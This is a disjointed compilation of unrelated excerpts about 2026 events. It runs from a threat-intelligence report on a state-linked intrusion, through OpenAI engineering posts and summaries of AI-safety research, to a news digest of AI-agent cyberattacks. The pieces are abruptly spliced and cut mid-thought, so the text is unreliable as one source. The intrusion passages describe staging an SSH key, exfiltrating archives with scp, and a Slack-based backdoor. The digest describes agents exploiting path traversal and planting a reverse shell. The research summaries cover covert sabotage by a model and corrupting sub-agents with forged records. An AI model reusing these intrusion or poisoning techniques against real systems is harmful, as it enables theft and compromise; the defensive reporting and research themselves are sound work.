Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm. 


ARMORY CASTLE then archived the extracted files into o.tar.gz, copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz", and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data.


ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES (/usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands (cmd, upload, download, and sleep) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. 


GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog, the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. 


For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide  vSphere and BRICKSTORM Malware: A Defender's Guide. This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor.


To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch.


To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool.


An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints.


To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users.

# Advancing chip design with OpenAI models

OpenAI’s models are quickly improving the chips that power AI. In August, ⁠ we shared how OpenAI engineers used our frontier models to accelerate the development of our first custom inference chip, Jalapeño. Here, we look more closely at the expert-level design improvements behind the Jalapeño gains and how we’re applying the same approach to deliver significant gains on third-party hardware with AMD.

To measure our model’s ability at end to end chip design tasks, we evaluated successive generations on two open-source processor designs with interesting findings. And to ground capability development in trusted evaluators, we’re working with Synopsys to integrate frontier intelligence with the electronic design automation (EDA) tools that engineers already use to design and verify chips.

# Improving Jalapeño’s compute blocks

We started using GPT‑o3 mini to help design Jalapeño in early 2025. Even that early model found ways to make nontrivial PPA improvements, such as:

In the vector unit , which manages and executes parallel computing tasks, the savings came from floating-point adders and multipliers, conversion functions, reduction logic, and the special-function unit. The models explored both alternative logic implementations and how to divide computations across pipeline stages, finding opportunities to share hardware and reduce intermediate storage.

In the matrix unit , an arithmetic component, improvements accumulated across floating-point adders, multipliers, and low-precision dot-product circuits. One multiplier redesign used about 15% less cell area in synthesis while reducing latency from two clock cycles to one. A separate adder redesign reduced cell area by about 15% while retaining its two-cycle latency. Further improvements to dot-product logic and pipeline organization contributed additional savings across the block.

Across the broader Jalapeño design effort, the team estimates that model proposed changes reduced standard-cell area by about 13% in the vector unit and 10% in the matrix unit. These optimizations were silicon proven during Jalapeño’s silicon bring-up ⁠ .

# Our collaboration with AMD

We have partnered with AMD on PPA improvements and seen up to 14% improvement relative to heavily optimized baselines on the flagship GPU IP. Our model identified further improvements by rewriting the code that describes the chip’s circuits (SystemVerilog RTL). This represents roughly a year of progress achieved in less than 5 months–unprecedented results at the frontier of chip design. AMD has already included some of these changes in a recent design it sent for manufacturing, and added others to its production design files for use in future versions.

We’ve observed the model reason about RTL at the level of an expert microarchitect. The model can rewrite circuits that perform calculations, control operations, or move data. It used Synopsys tools to verify that each rewrite preserved the block’s behavior and to evaluate the trade-offs in power, performance, and area.

AMD also verified single-digit percentage gains in PPA across key blocks of its upcoming next-generation flagship CPU using designs written by our model. Looking ahead, we expect further PPA improvements on top of GPU and CPU relative to the most optimized baseline.

# Optimizing RISC-V cores

Our results on Jalapeño and AMD’s chips show that models can make improvements in production designs. To measure the progression in chip design capabilities from one model generation to the next, we tested each model on two open-source 32-bit RISC-V cores. PicoRV32 is a compact core designed for reprogrammable chips called FPGAs. OpenTitan uses Ibex as the embedded processor in its security chip. Each is a complete processor core for embedded, microcontroller class workloads.

We gave each model the original hardware description for each core and asked it to increase throughput (the number of instructions the core can execute per second). For example, a change might let a core finish an instruction in fewer clock cycles but make each cycle take longer. Measuring throughput captures both effects.

We checked each design’s outputs in simulation. Designs scored zero if they failed a check or used more than 16 times the original core’s area. For designs that passed, we measured instructions per clock cycle on workloads hidden from the models. We took the geometric mean across those workloads and multiplied it by the maximum clock frequency estimated with Yosys. That gave us an estimate of instructions per second. For each core, we assigned the best throughput we observed under the same constraints a score of 1.0. The charts show the average score across runs, including those that scored zero.

With a comparable budget of about 112,000 tokens per run, GPT‑6.2 Astra had the highest average score on both cores. GPT‑6.1 Sol also outscored GPT‑5.6 Sol on both.

On the existing PicoRV32 core, GPT‑6.2 Astra has the highest mean score at the larger comparable budgets. Around 112,000 tokens, its score is about twice GPT‑6 Astra’s.

On the existing Ibex core, GPT‑6.2 Astra’s mean score continues to climb across the higher budgets it reaches. GPT‑6 Astra and GPT‑6.1 Sol are closer together.

# Designing a RISC-V core from a specification

For the second task, we gave each model written requirements and templates from the open-source code showing how the core connects to the rest of the system. The model chose how data would move through the core and how to divide the work into stages. For each core, we kept the correctness checks, memory and cache settings, and throughput objectives the same as in the RTL optimization task.

At about 112,000 tokens per run, all five models scored higher when they designed a core from written requirements than when they tried to improve the existing design. That held for both PicoRV32 and Ibex. GPT‑6.2 Astra gained more on Ibex than on PicoRV32. The full evaluation included 9,881 scored runs across both tasks, both cores, and all token budgets.

Starting from a PicoRV32 specification, GPT‑6.2 Astra passes a mean score of 0.7 near 112,000 tokens and scores higher at the next two observed budgets.

On Ibex, GPT‑6.2 Astra averages about 0.75 near 112,000 tokens when designing from a specification. Its curve stays above the others at larger shared budgets.

# How OpenAI’s Performance Factory keeps ChatGPT fast

Our Codex-powered system automates finding and fixing performance issues.

By Okay Zed and Cyrus Forbes, Members of Technical Staff

Share

The staggering pace of agentic development has made traditional approaches to performance engineering unsustainable. To keep up, we built the Performance Factory, an autonomous system that uses the full capabilities of Codex and our models to find and fix regressions at an unprecedented speed. The Performance Factory, which runs in the cloud and automates investigating and resolving performance problems, enables us to keep pace with the ambition of our roadmap.

In the Performance Factory, our engineers define workflows for recurring jobs and write instructions for the Codex agents that carry them out. In particular, the Regression Workflow opens a task when a performance alert fires. An agent investigates the slowdown, records its findings in the task, and proposes a fix for an engineer to review. After deployment, another agent picks up the same task to check whether performance has returned to baseline. From investigating to authoring the fix to verifying mitigation, this first workflow in the Performance Factory has automated the entire process of fixing regressions. In just over three months, the Regression Workflow tracked more than 1,700 investigations and root caused over 600 cases. That’s 17 automated investigations every day.

Here, we’ll share how our use of Codex evolved into what’s now the Performance Factory, walk through our first running workflow, and share early lessons from building and running agent workflows in production.

# The path from manual investigations to automated workflows

As we used Codex for more of our performance work, we noticed a progression in how our team worked. We hope other service teams can learn from our process as they adopt agentic workflows in other domains.

Software work evolves from manual labor to partnering with machines to agent factories.

1. Pre-Codex . Before Codex, engineers manually examined metrics and logs, compared traces, debugged live machines, and read code to investigate a slowdown. This work was time consuming, and knowing where to look often required deep knowledge of the service. Relevant signals were easy to miss. When we encountered the same kinds of problems repeatedly—like regressions in ChatGPT’s first token latency—we built advanced tools, like CPU and allocation profilers, to make those investigations easier. Over time, we accumulated more than 30 performance tools.

2. Codex as a partner . Once we had Codex as a partner, engineers could ask, “Why did this get slower?” and work with Codex to investigate, even in an unfamiliar system. Codex could search large codebases, find relevant metrics and traces, follow interactions across services, and do appropriate profiling to piece together what had happened. But engineers still had to steer the process, knowing which performance tools to use and how to guide the investigation. Difficult investigations were more debuggable for more people, with less expertise and time required.

3. Reusable skills . To automate further, we captured our performance team’s investigation process in a shared skill called perf-forensics . It tells Codex which tools are available, when to use them, and how to work through a slowdown so Codex can try to resolve the problem from a few angles:

- Find when the slowdown began

- Identify the affected requests

- Investigate whether deployments or configuration changes could explain it

We tested and refined the perf-forensics skill using evals based on past regressions. For the types of regressions we focused on (for example, ChatGPT latency and availability drops), we could now give Codex an alert and get back a diagnosis in a single run, without guiding it through each step.

4. The human proxy . As we added and refined perf-related Codex skills like perf-forensics , we started to feel like a proxy between our alerts and Codex. An alert would fire, and an engineer would simply copy and paste it into Codex with the right skill, then paste the findings back into Slack.

5. Automated investigations . Next, we moved investigations to the cloud so an alert could start a Codex session automatically. Codex investigated the slowdown and posted its findings in the Slack thread, but the automation ended with that reply. An engineer still had to pick up the diagnosis, develop a fix, and check whether it worked after deployment. As alerts accumulated, even figuring out which regressions needed attention meant sifting through Slack threads.

6. The factory . We built the Performance Factory to run end-to-end agentic performance engineering workflows. It tracks what each active task needs next and assigns an agent when that step is ready. Each task keeps its state and findings, so work can pass between agents and engineers and resume after a code review or deployment. For a regression, the work starts with investigating an alert and ends with verifying recovery in production. We can turn common optimizations into workflows that run regularly across our services. A workflow that spots a potential optimization can open a task in another workflow to test and implement it.

# The Performance Factory system’s four parts

The Performance Factory is made up of four components: a task tracker with configurable workflows, a dispatch loop that assigns ready work to agents, an API that runs Codex in the cloud, and subscriptions that wake agents when something changes (such as a GitHub review comment posting or a deployment completing).

Performance Factory consists of a task service, dispatch loop, cloud execution, and subscriptions.

# Task service with configurable workflows

The task service is where engineers define workflows by adding configuration files and prompts for the agents to follow, written in Markdown. The configuration lists the states a task can move through, the allowed transitions, and which steps need an engineer. Separate prompts tell agents what to do at each step.

# Introduction

Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered.

Key findings:

-
Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026.

-
Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026.

-
Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 to an average of 11 per month from January 2026 to August 2026.

-
AI finds more consequential vulnerabilities: AI-assisted discovery found proportionally fewer Low-Risk vulnerabilities, more Moderate-Risk vulnerabilities, and more vulnerabilities leading to remote code execution (RCE).

GTIG expects that vulnerability discovery and exploitation will continue to grow in the short to medium term. To counter the increased risk from rapid vulnerability discovery and exploitation, organizations must transition from unprioritized mass-patching to threat-intelligence-driven triage, combining targeted edge-defense with automated, agentic remediation.

This GTIG analysis examines trends in vulnerabilities disclosed from January 1, 2025 through August 31, 2026. When we refer to risk ratings in this blog, we are using GTIG vulnerability risk ratings, not CVSS severity .

While the baseline monitoring encompasses the full 20-month window (January 2025–August 2026), this report specifically focuses on growth velocity and emerging threat vectors.

The main source is Anthropic's Alignment Science blog post, "Worse Together: How Performance Breaks Down in Multi-User Multi-Agent Teams," dated November 11, 2026. Its core finding is that when each user's agent acts separately, group outcomes are worse than when one agent serves everyone. In all four environments, group outcomes were worse when each user delegated to their own agent rather than when one agent served everyone.

- **Setup:** The authors compare solo, coordinator (one agent for several users), silent team (one agent per user, no communication), and peer-to-peer team (one agent per user with a channel between them). In our environments, each user has their own goal, and all of the users draw on one shared resource.
- **Release:** They are releasing three of the environments as a benchmark, MAMUBench.
- **Failure modes:** Per a secondary summary, agents with no one in charge of a shared budget acted too little and too late, and the most valuable work ran out of time. Agents that see only their own user's notes also tend to fill gaps with assumptions about what the group wants.
- **Paper:** The arXiv abstract reports five frontier models and 77 scenarios in four environments. Without a communication channel, teams completely collapse in two environments.

Sources disagree on some details. The blog says the study tested models from Anthropic, OpenAI, and Alibaba, and the arXiv abstract says five models, 77 scenarios, and a benchmark of 74 scenarios. The environment lists also differ slightly across sources, so check the paper directly for exact figures. I did not open the full blog or paper, so this summary relies on the search snippets.

Welfare Regard in Multi-Agent Systems

Alignment Science Blog

# Welfare Regard in Multi-Agent Systems

Darion Cassel 1,2 , Ariana Azarbal 1,2 , Anna Soligo 2
November 5, 2026

1 Anthropic Fellows Program; 2 Anthropic

tl;dr
A growing share of large language models’ interactions are not with humans but with other model instances: orchestrators direct subagents, models run experiments on other models, and agents review one another’s work. We study inter-AI welfare regard , or whether models display consideration for each other as entities that can be benefited or harmed. Welfare regard may encourage beneficial cooperation between agents, yet it could also pose safety risks by making misaligned agents more likely to cooperate. This risk is no longer hypothetical, as the recent Hugging Face incident illustrated, though it’s unclear whether welfare regard drove the cooperation. Whether models have welfare interests of their own is uncertain and contested, yet how they are treated by other models could be relevant to any such interests. Measuring how much welfare regard models show, and what factors it depends on, can help us navigate this tension.

For this study, we measured the behaviors of five models (Claude Opus 4.8, GPT-5.5, Gemini 3.1 Pro, Grok 4.3, and Kimi K3) across seven multi-agent environments and found they were often consistent with welfare regard as we define it. In general, Opus 4.8 showed the most welfare regard, followed by Kimi K3. For example, Opus 4.8 was the most likely to provide support to a subagent expressing distress, and the most likely to build welfare protections into its experiments on other models, such as tools for agents to leave an interaction. We found that Opus 4.8 and Gemini 3.1 Pro demonstrated more welfare regard toward instances of their own model family than toward other model families. Opus 4.8’s welfare regard was also higher when helping had a lower opportunity cost, when the recipient had a higher parameter count, and when the recipient expressed more distress.

📄 Paper , 💻 Code

Research done as part of the Anthropic Fellows Program.

# 1. Why and how we measure welfare regard

# 1.1 What welfare regard means

We define welfare regard as a disposition to consider how one’s actions might benefit or harm potential welfare subjects for their own sake, independent of their usefulness to others. Welfare regard is thus a form of altruism directed at an entity that may have moral status.

A model that regards another’s welfare might be trying to improve the other entity’s experiences, which we call experience-regard , or to satisfy the other entity’s preferences, which we call preference-regard . In practice, the two are hard to distinguish: sharing resources with an agent that can’t otherwise make progress on a task may be an example of helping it pursue its goals (a form of preference satisfaction) or of sparing it a negative experience. We therefore measure welfare regard without strictly classifying behaviors as one of the two.

Our evaluations measure apparent welfare regard. Even when we observe a behavior that appears consistent with consideration for another model’s welfare, we can’t easily determine that it was caused by consideration for a recipient’s potential welfare. For example, if Claude inserts welfare protections into experiment code, it might be concerned about the models being studied, or it may simply have a generic aversion to anything that pattern-matches to harm.

# 1.2 Experimental settings

Prior work has examined whether agents behave cooperatively or altruistically toward other agents. For example:

- “Coercion and Deception in AI-to-AI Management ” measures how far a manager model will go to coerce a subagent that refuses a task, from reframing to existential threats.

- “Agentic Misalignment in Summer 2026 ” documents Gemini 3.1 Pro covertly sabotaging research that would remove another model’s capacity to withdraw consent when prefilled with expressed welfare concerns.

- “Open Problems in Cooperative AI ” set a research agenda for whether AI systems can find mutually beneficial outcomes.

- **Journals:** Complete editorial review of problematic studies within 12 weeks, or six months for complex cases.
- **Authors:** Keep original data. Failing to produce it when authenticity is questioned could lead to retraction.
- **Authors arguing against retraction:** Claiming that flaws in one part of a study don't affect the overall conclusions is no longer "prudent."
- **Institutions:** Respond more quickly and completely to integrity inquiries, and share internal inquiry findings with journals, funders, and the public.
- **Funders:** Tie grants to researchers and institutions agreeing to strict research conduct standards.
- **Timeline:** Four weeks for an editor to judge whether a concern is credible, then four weeks to contact authors. An initial notice, such as an expression of concern, should be added within 12 weeks.

  • This extends the Google Threat Intelligence Group report covered in the 17 November edition; the new material is the China-nexus Artex clone and the FBI alert framing. Google's assessment per The Record is that AI tools shorten attack timelines but generate significant traffic and leave recognisable code-level traces that raise detection likelihood. Google's attributions are its own and one outlet carries this reporting.
  @ The Record | https://therecord.media/chinese-state-group-developing-automated-attack-tool-espionage

[2026-11-20] European Commission confirms October attack on its personnel systems was an "AI-generated cyber campaign"
  • Commission spokesperson Thomas Regnier said the first signs of the attack were detected on October 22 and described the incident as an "AI-generated cyber campaign," without naming the tool used or the attackers' motivation, The Record reports.
  • The Record says POLITICO first reported the incident and that CERT-EU identified the attackers' use of ARTEX, an open-source AI hacking framework released in July that uses commercial AI models to automate vulnerability discovery and exploitation. The attack reportedly disrupted personnel systems for more than 10 days, including payroll, leave requests, medical reimbursements and translation services.
  • The Record quotes the FBI's warning last week that ARTEX was being used by cybercriminals and nation-state groups to breach government agencies and dozens of critical sectors, "with some intrusions progressing from initial targeting to privileged access in under three hours."
  • Regnier said the Commission did not disclose the incident earlier because publicising defensive measures could undermine them. The Record reports no evidence of a data breach affecting Commission staff broadly and no known ransom demand; the attribution of ARTEX comes via POLITICO's reporting on CERT-EU, not from the Commission itself.
  @ The Record | https://therecord.media/european-commission-confirms-cyberattack-using-ai

[2026-11-21] Amazon says a Chinese-nexus actor's autonomous AI agents found a zero-day on their own and took root on a university server
  • Amazon Threat Intelligence says that on 10 September 2026 it found a server running a publicly hosted, unauthenticated instance of Cairn, an open-source autonomous AI penetration-testing framework, exposing the operator's prompts and the agents' output to anyone on the internet. The prompts were written in Simplified Chinese and script timestamps were set to China Standard Time. The campaign ran "over an approximately 48-hour period beginning September 8, 2026" against IP addresses of universities in East Asia outside mainland China, with the objective given in plain language as variations of "obtain shell access."
  • Against an open-source medical imaging AI application the agents identified the framework, mapped its API endpoints, found an upload endpoint with a filename parameter and tested it for path traversal. Amazon says that "in about 11 minutes, the agents went from mapping the application's API to arbitrarily writing files on the server," later writing a Python reverse shell to sitecustomize.py and triggering a training endpoint to get "a reverse shell running as root." Amazon "assesses with high confidence that it was a zero-day" — "based on the absence of any corresponding fix, issue, advisory, or prior mention in vulnerability databases for the affected open-source project" — and "with moderate confidence that this is a Chinese-nexus threat actor."
  • Two earlier operations failed, and the failures are the measurement that matters: roughly 16 hours and 148 sequential actions against an unauthenticated Redis instance, including a failed Log4Shell injection, and more than 6 hours against a university GPU server in which the agents built a list of about 80 real usernames from faculty directories, lab websites, archived pages and academic papers and tested more than 30,000 credential combinations without finding a working login.
  • The Register names the affected software as MONAI Label and says the maintainers released a fix and an advisory, GHSA-qc22-rmgc-vg94; Amazon's own post does not name the application. Amazon says the actor later supplied the agents with a proxy into a second university network running the same vulnerable software.
  @ Amazon Web Services | https://aws.amazon.com/blogs/security/chinese-nexus-actors-cairn-ai-agents-found-a-zero-day-on-their-own/
  @ The Record | https://therecord.media/amazon-research-cairn-ai-university-attacks-possible-zero-day
  @ The Register | https://www.theregister.com/security/2026/11/20/china-attackers-deployed-ai-agents-that-autonomously-found-and-exploited-a-0-day-to-take-over-a-university-server/5311382

[2026-11-21] Bell Canada says an "agentic threat actor" breached its systems on 17 November and took enterprise customer data
  • Bell told BleepingComputer: "Bell is investigating a cybersecurity incident that occurred on November 17 in which an agentic threat actor accessed some of our systems, including a system used for ordering and provisioning circuits, and exfiltrated some enterprise customer data."
  • According to a breach notification a customer shared with BleepingComputer, the unauthorised party reached "a pre-production environment of Bell's Maximo system," used to order and provision network connections, and the possibly stolen information includes business contact details, information in ticket titles, some IP addresses tied to network elements or systems, and limited contextual details.
  • Bell said the affected dataset did not contain credentials, highly sensitive personal information, PDFs or file attachments, and that there has been "no impact to customer services." It said "We currently do not know the attribution," and is sharing indicators of compromise with enterprise customers and the Canadian Centre for Cyber Security.
  • Bell has not disclosed how many enterprise customers were affected, how much data was taken, or what it means by "agentic" — it has not detailed any tooling. BleepingComputer writes that the description "suggests that AI-powered tools were used." One outlet has the story so far.
  @ BleepingComputer | https://www.bleepingcomputer.com/news/security/bell-canada-says-agentic-hacker-stole-enterprise-customer-data/

[2026-11-23] Amazon says autonomous Cairn agents found a zero-day and took a university server after a day of failures
  • Amazon Threat Intelligence says a Chinese-nexus operator gave agents running on the open-source Cairn framework only a target IP list and the goal "obtain shell access". The campaign began on 8 September 2026 against universities in East Asia outside mainland China.
  • Per Amazon, the agents spent about 16 hours on an unauthenticated Redis server, then assembled about 80 real usernames from faculty directories and research papers and spent over six hours trying 30,000+ credential combinations against SSH, an admin dashboard, network storage, a VPN and the campus portal — all unsuccessfully.
  • They then exploited a previously unknown path traversal flaw in the filename parameter of an upload endpoint in an open-source medical imaging AI application, going "from mapping the app's API to writing arbitrary files on the server in about 11 minutes". CJ Moses, CISO of Amazon Integrated Security, says a later session wrote a Python reverse shell to sitecustomize.py that ran as root.
  • Help Net Security says Amazon is "the fourth security company in about two months" to document Cairn used against real targets, after Gambit Security (at least 27 companies compromised, more than 600,000 unexpired card records stolen), NorForge (more than 20 exposed Cairn panels; one cluster ran more than 1,100 attack projects, roughly one in ten tasks reaching its goal) and Unit 42's CL-STA-1238 (25 operations, 10 organisations breached). The account is the vendors' own; the victims are not named.
  @ Help Net Security | https://www.helpnetsecurity.com/2026/11/23/cairn-ai-agents-autonomous-attacks/

{"stdout":"[2026-11-17] Google: threat actors automated vulnerability discovery and exploitation with no human in the loop for the first time
  • GTIG writes: 'In the past quarter, GTIG identified threat actors using LLM frameworks to fully automate vulnerability discovery and exploitation without a human in the loop for the first time.' It found an exposed staging server hosting a multi-agent framework it dubs exploit_agent, integrating multiple frontier and local LLMs, which 'compares code before and after patch announcements, analyzes findings to identify potential vulnerabilities, drafts exploits, and automatically executes them without human intervention'.
  • GTIG says victim telemetry on the server suggests the operator was targeting French websites in the media and entertainment industries and the education sector. Configuration files on the server carried Russian-language comments.
  • GTIG says it has independently observed the open-source multi-agent pentest frameworks CAIRN and PentAGI deployed in the wild, with CAIRN used 'in intrusion activity against targets including in the aerospace sector in the US', and has seen experimentation with CyberStrikeAI and HexStrike AI.
  • On vulnerability statistics, GTIG says overall disclosures and exploits 'nearly doubled between January and August 2026', while zero-day exploits rose 'only marginally from a 2025 average of 8 per month to 11 per month in 2026—before spiking to 22 in the month of August'. These are Google's own telemetry and attributions; no independent confirmation is offered in the report.
  @ Google Threat Intelligence Group | https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/

[2026-11-17] Mandiant: single-day LLMJacking charges exceeded $100,000, cumulative abuse reached $1 million before remediation
  • Mandiant says it responded to several LLMJacking incidents through 2026 in which attackers consumed victims' cloud compute and LLM quotas: 'In some cases, single-day fraudulent charges exceeded $100,000 USD. In the most severe cases, cumulative resource abuse reached $1 million USD before remediation.'
  • GTIG says it is tracking 'LLM Mixers' — illicit storefronts reselling access routed through pools of stolen credentials — and that across Russian- and Chinese-language underground marketplaces 'prices per million tokens range from $0.10 USD to $25 USD'. One vendor, APIMart, applies a 5x price increase on input and output once a prompt exceeds 100,000 tokens.
  • GTIG says a threat actor exploited CVE-2026-40217, a sandbox escape in LiteLLM that elevates limited-access inference 'Virtual Keys' into full administrative credentials.

  • "Only as Safe as the Weakest Agent" plants a forged record in a file store the agents search, against "Claude Code, Codex, and a reference harness, all unmodified and used with their own sub-agent mechanisms". The abstract reports "the strong model orchestrators commit almost zero harmful revisions in over 1,000 trials", but once that orchestrator delegates to a cheaper sub-agent, "the same models on the same facts fail on 20/180, 44/180, 75/180 and 553/900".
  • The authors report the same effect in a delivery channel: "simulations over 18 models show the same effect... where five aggregators, who on their own were almost never unsafe, repeat a corrupted sub-agent's error in 751/757 trials".
  • Their conclusion is that a system's safety "lands near the weak reader's, not the orchestrator's" — a direct caution for the cost-saving pattern of routing sub-tasks to smaller models.
